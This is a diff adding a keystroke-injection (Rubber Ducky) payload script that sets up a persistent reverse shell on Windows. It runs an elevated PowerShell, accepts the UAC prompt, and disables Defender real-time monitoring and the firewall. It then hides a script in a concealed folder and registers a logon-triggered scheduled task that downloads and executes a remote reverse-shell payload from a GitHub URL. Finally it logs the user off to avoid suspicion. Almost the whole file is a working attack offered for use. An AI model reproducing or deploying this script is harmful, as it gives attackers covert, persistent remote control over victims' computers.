@@ -1,0 +1,110 @@
+REM Title: Netcat Reverseshell On Log In
+REM Description: Creates a PowerShell Task to remotely connect to the computer with netcat every time the user logs in
+REM Author: https://github.com/HokkaidoInu
+REM Author notes above
+
+REM heavily modified, added firewal disabeling capabilities++
+REM likely you will have to add speed changes, these speeds just worked on my laptop
+
+REM closes file explorer, w/hotkey
+DELAY 500
+ALT F4
+
+REM init wait for debugging purposes
+DELAY 9000
+
+REM run window, powershell, hotkey to prompt admin window
+GUI r
+DELAY 1500
+STRING powershell.exe
+DELAY 1500
+CTRL SHIFT ENTER
+DELAY 2000
+
+REM click yes on UAC (user account control)
+LEFT
+DELAY 500
+ENTER
+DELAY 2000
+
+REM fullscreen powershell window
+ALT SPACE
+DELAY 500
+STRING x
+DELAY 500
+ENTER
+
+REM just some space in window
+DELAY 500
+ENTER
+ENTER 
+DELAY 500
+
+REM disable real time protection, tamper protection has to be manually turned off or u fails
+STRING Set-MpPreference -DisableRealtimeMonitoring $true
+DELAY 500
+ENTER
+
+REM turn off firewall, does not reset on restart, ^^^ does, do every time
+STRING netsh advfirewall set allprofiles state off
+DELAY 500
+ENTER
+
+REM just defining variables in powershell
+STRING $jobName = "TotallySafeJob4"
+ENTER
+
+REM set user logon to trigger
+STRING $Trigger = New-ScheduledTaskTrigger -AtLogOn
+ENTER
+
+REM where we will write our ps script to on system
+STRING $hiddenFolder = "C:\MyHiddenFolder"
+ENTER
+
+REM check if folder there, silent errors, think creates as well
+STRING if (!(Test-Path $hiddenFolder)) { New-Item -ItemType Directory -Path $hiddenFolder -Force -ErrorAction SilentlyContinue; Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value ([IO.FileAttributes]::Hidden) }
+ENTER
+DELAY 500
+
+REM defining script, disable live protection, get script from github I have public raw, use in script
+STRING $Script = "Start-Transcript -Path 'C:\MyHiddenFolder\TotallySafeJob.log' -Append; Set-MpPreference -DisableRealtimeMonitoring $true; $Script=Invoke-WebRequest 'https://raw.githubusercontent.com/PH-Tech-Portfolio/musical-octo-spork/main/payload-reverse-shell.txt' -UseBasicParsing; $ScriptBlock=[Scriptblock]::Create($Script.Content); & $ScriptBlock; Stop-Transcript"
+ENTER
+DELAY 1500
+
+REM need runlevel highest or get permission error on disabeling firewall, need env username or stuck in session 0
+STRING $Principal = New-ScheduledTaskPrincipal -RunLevel Highest -UserId $env:USERNAME
+ENTER
+DELAY 500
+
+REM what will be done on the task, but symanticS
+REM in action after no profile we can set extera commands or argument -hidden to not display PS winow, displaying for debugging purposese
+STRING $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -NoExit -File `"$hiddenFolder\myScript.ps1`""
+ENTER
+DELAY 500
+
+REM if there is already task like this then remove, error minimized if not
+STRING Unregister-ScheduledTask -TaskName $jobName -ErrorAction SilentlyContinue -Confirm:$false
+ENTER
+DELAY 500
+
+REM our hidden folder with powershell script
+STRING Set-Content -Path "$hiddenFolder\myScript.ps1" -Value $Script -Force
+ENTER
+DELAY 500
+
+REM finally actually register the task, use variables with all the other stuff we defined
+STRING Register-ScheduledTask -TaskName $jobName -Action $Action -Trigger $Trigger -Principal $Principal
+ENTER
+
+REM debugging wait before logout, check for errors
+DELAY 5000
+
+STRING echo "Bye Bye NOW!"
+ENTER
+DELAY 500
+
+REM used to restart computer, just need to log them off, minimal sus level
+STRING logoff.exe
+ENTER
+DELAY 500
